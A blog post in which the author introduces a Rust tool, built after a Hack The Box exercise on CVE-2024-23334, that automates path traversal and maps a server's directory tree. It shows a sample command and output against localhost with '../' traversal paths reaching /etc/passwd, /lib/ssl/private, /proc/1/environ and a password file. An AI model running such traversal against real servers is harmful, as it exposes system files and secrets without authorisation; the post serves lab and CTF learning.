---
layout: post
title: 'Path Traversal Directory Tree - v1'
created-at: 2025-02-08
categories: ["Tool", "Cybersecurity", "Rust"]
---

## Intro

[Path Traversal Directory Tree](https://github.com/henriquetorquato/path-traversal-directory-tree/tree/main) is a tool I made after completing the [Hack The Box - Machine Write-Up: Chemistry]({% link _posts/2025-02-04-hack-the-box-machine-chemistry.md %}). During the machine exploitation, I ended up using [this](https://github.com/z3rObyte/CVE-2024-23334-PoC) tool made by [@z3rObyte](https://github.com/z3rObyte) in combination with [gobuster](https://github.com/OJ/gobuster) to take advantage of `CVE-2024-23334`.

[@z3rObyte's](https://github.com/z3rObyte) existing script basically looked up the root level using path traversal. Knowing that, I could plug in each directory and let gobuster deal with enumerating the files on the directory.

The whole process was still very manual, and I wanted something that would be able to do this and map all directories at once.

## Why Rust?

I've been interested in learning Rust lately, but I find difficult to sit down and study things without a proper goal. I usually study programming languages by working with them on projects. That way, I have a driving goal = finish the project, and will lean a little bit about the technology on the way.

## How it works?

You have to specify the target host and a word list to be used for enumeration. If it is unknown if the host is vulnerable or not, a first step is run using the provided word list to discover which directory gives access to the traversal.

You can also specify a list of file extensions that will be appended to the words from the wordlist.

### Sample result

```
> ./path-traversal-directory-tree.exe -u "http://localhost:8080" -e txt -w .\poc\wordlist\common.txt -l 10 -d static
== Starting Search for Root path ==
Target host: http://localhost:8080
Target file: /etc/passwd
Vulnerable Directory: /static
Max search levels: 10
Wordlist: .\poc\wordlist\common.txt
===
== Root path found ==
Vulnerable directory: /static
Level: 8
Sample path: http://localhost:8080/static/../../../../../../../../
== Running directory mapping ==
Directory: http://localhost:8080/static/../../../../../../../../bin/
File: http://localhost:8080/static/../../../../../../../../bin/ar/
File: http://localhost:8080/static/../../../../../../../../bin/arch/
File: http://localhost:8080/static/../../../../../../../../bin/as/
File: http://localhost:8080/static/../../../../../../../../bin/bash/
...
Directory: http://localhost:8080/static/../../../../../../../../lib/ssl/
Directory: http://localhost:8080/static/../../../../../../../../lib/ssl/certs/
Directory: http://localhost:8080/static/../../../../../../../../lib/ssl/misc/
Directory: http://localhost:8080/static/../../../../../../../../lib/ssl/private/
Directory: http://localhost:8080/static/../../../../../../../../lost%2Bfound/
Directory: http://localhost:8080/static/../../../../../../../../media/
File: http://localhost:8080/static/../../../../../../../../media/password.txt      <-- Interesting file
Directory: http://localhost:8080/static/../../../../../../../../opt/
Directory: http://localhost:8080/static/../../../../../../../../proc/
Directory: http://localhost:8080/static/../../../../../../../../proc/1/
File: http://localhost:8080/static/../../../../../../../../proc/1/comm/
File: http://localhost:8080/static/../../../../../../../../proc/1/environ/
...
```

## Contributing 

The repository can be found here: [https://github.com/henriquetorquato/path-traversal-directory-tree/tree/main](https://github.com/henriquetorquato/path-traversal-directory-tree/tree/main)